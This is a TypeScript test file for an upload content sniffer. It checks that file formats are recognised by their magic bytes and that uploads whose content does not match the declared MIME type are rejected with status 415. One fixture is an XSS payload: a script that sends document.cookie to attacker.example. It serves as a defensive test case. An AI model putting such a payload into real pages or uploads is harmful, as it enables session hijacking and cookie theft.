// =============================================================================
// Task #117 — tests for the upload content sniffer.
// -----------------------------------------------------------------------------
// Locks in three guarantees:
//
//   1. The sniffer recognises every family in the upload allow-list from
//      its real magic bytes (PDF, JPEG, PNG, GIF, WebP, HEIC, TIFF, OOXML
//      zip, OLE2, plain text). Without this, a regression in the byte
//      checks would silently start refusing legitimate uploads.
//
//   2. `assertContentMatchesDeclaredMime` THROWS with status 415 and the
//      stable `UPLOAD_CONTENT_MISMATCH` code when the bytes don't match
//      the declared mime — including the headline attack: HTML payload
//      labelled `image/png`. The throw happens BEFORE the upload service
//      hands bytes to object storage, so a regression here is the
//      difference between "rejected at the gate" and "rendered in a
//      victim's browser".
//
//   3. Declared mimes that aren't on the supported map throw too — even
//      if the bytes are recognised. This is the failing-closed contract
//      for any future caller that bypasses the multer allow-list.
// =============================================================================

import { describe, expect, it } from "vitest";
import {
  assertContentMatchesDeclaredMime,
  detectFileFamily,
  UploadContentMismatchError,
} from "./upload-content-sniffer";

// Minimal fixtures: just the leading magic bytes of each format. The sniffer
// only inspects the prefix, so we don't need a complete file.
const fixtures = {
  pdf: Buffer.from("%PDF-1.4\n%binary\n"),
  jpeg: Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]),
  png: Buffer.from([
    0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d,
  ]),
  gif: Buffer.from("GIF89a..."),
  webp: Buffer.concat([
    Buffer.from("RIFF"),
    Buffer.from([0x24, 0x00, 0x00, 0x00]),
    Buffer.from("WEBP"),
  ]),
  // Synthesised ftyp box with a HEIC brand. Box size is 32 (0x20).
  heic: Buffer.concat([
    Buffer.from([0x00, 0x00, 0x00, 0x20]),
    Buffer.from("ftyp"),
    Buffer.from("heic"),
    Buffer.alloc(20, 0),
  ]),
  tiffLe: Buffer.from([0x49, 0x49, 0x2a, 0x00, 0x08, 0x00, 0x00, 0x00]),
  tiffBe: Buffer.from([0x4d, 0x4d, 0x00, 0x2a, 0x00, 0x00, 0x00, 0x08]),
  zip: Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00]),
  ole2: Buffer.from([
    0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, 0x00, 0x00,
  ]),
  text: Buffer.from("name,age\nalice,30\nbob,29\n"),
  htmlAttack: Buffer.from(
    "<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>",
  ),
  doctypeAttack: Buffer.from("<!DOCTYPE html>\n<html><body>oops</body></html>"),
  randomBinary: Buffer.from([0x00, 0x01, 0x02, 0x03, 0xff, 0xfe, 0xfd, 0xfc]),
};

describe("detectFileFamily", () => {
  it.each([
    ["pdf", "pdf"],
    ["jpeg", "jpeg"],
    ["png", "png"],
    ["gif", "gif"],
    ["webp", "webp"],
    ["heic", "heic"],
    ["tiffLe", "tiff"],
    ["tiffBe", "tiff"],
    ["zip", "zip-ooxml"],
    ["ole2", "ole2"],
    ["text", "text"],
  ] as const)("recognises %s bytes as family %s", (key, family) => {
    expect(detectFileFamily(fixtures[key])).toBe(family);
  });

  it("does NOT classify HTML/script payloads as plain text", () => {
    // Both attack shapes must sniff as "unknown" so an HTML body labelled
    // text/plain can't slip through the text family.
    expect(detectFileFamily(fixtures.htmlAttack)).toBe("unknown");
    expect(detectFileFamily(fixtures.doctypeAttack)).toBe("unknown");
  });

  it("returns 'unknown' for random binary that matches no signature", () => {
    expect(detectFileFamily(fixtures.randomBinary)).toBe("unknown");
  });

  it("returns 'unknown' for buffers that are too short", () => {
    expect(detectFileFamily(Buffer.from([0x25]))).toBe("unknown");
    expect(detectFileFamily(Buffer.alloc(0))).toBe("unknown");
  });
});

describe("assertContentMatchesDeclaredMime", () => {
  it("returns the detected family when content matches declared mime", () => {
    expect(
      assertContentMatchesDeclaredMime("application/pdf", fixtures.pdf),
    ).toBe("pdf");
    expect(assertContentMatchesDeclaredMime("image/png", fixtures.png)).toBe(
      "png",
    );
    expect(
      assertContentMatchesDeclaredMime(
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        fixtures.zip,
      ),
    ).toBe("zip-ooxml");
    expect(
      assertContentMatchesDeclaredMime("application/msword", fixtures.ole2),
    ).toBe("ole2");
  });

  it("is case-insensitive for the declared mime type", () => {
    expect(
      assertContentMatchesDeclaredMime("Application/PDF", fixtures.pdf),
    ).toBe("pdf");
  });

  it("throws 415 UPLOAD_CONTENT_MISMATCH when HTML is uploaded as image/png (the headline attack)", () => {
    let thrown: unknown;
    try {
      assertContentMatchesDeclaredMime("image/png", fixtures.htmlAttack);
    } catch (e) {
      thrown = e;
    }
    expect(thrown).toBeInstanceOf(UploadContentMismatchError);
    const err = thrown as UploadContentMismatchError;
    expect(err.status).toBe(415);
    expect(err.code).toBe("UPLOAD_CONTENT_MISMATCH");
    expect(err.declaredMimeType).toBe("image/png");
    // Could be "unknown" depending on heuristic — the contract is "not png".
    expect(err.detectedFamily).not.toBe("png");
  });

  it("throws 415 when an executable-looking buffer is uploaded as application/pdf", () => {
    expect(() =>
      assertContentMatchesDeclaredMime("application/pdf", fixtures.randomBinary),
    ).toThrow(UploadContentMismatchError);
  });

  it("throws 415 when the declared mime is missing entirely", () => {
    expect(() =>
      assertContentMatchesDeclaredMime(null, fixtures.pdf),
    ).toThrow(UploadContentMismatchError);
    expect(() =>
      assertContentMatchesDeclaredMime("", fixtures.pdf),
    ).toThrow(UploadContentMismatchError);
  });

  it("throws 415 when the declared mime is outside the supported map (e.g. text/html, application/zip)", () => {
    // Even when bytes are recognised — text/html is not a supported upload
    // type so the call must fail closed.
    expect(() =>
      assertContentMatchesDeclaredMime("text/html", fixtures.text),
    ).toThrow(UploadContentMismatchError);
    expect(() =>
      assertContentMatchesDeclaredMime("application/zip", fixtures.zip),
    ).toThrow(UploadContentMismatchError);
  });

  it("rejects an OOXML mime when the bytes are an OLE2 file (and vice versa)", () => {
    // .docx label, .doc bytes — would otherwise be a confusion that lets a
    // legacy macro-laden file through under a modern label.
    expect(() =>
      assertContentMatchesDeclaredMime(
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        fixtures.ole2,
      ),
    ).toThrow(UploadContentMismatchError);
    expect(() =>
      assertContentMatchesDeclaredMime("application/msword", fixtures.zip),
    ).toThrow(UploadContentMismatchError);
  });
});
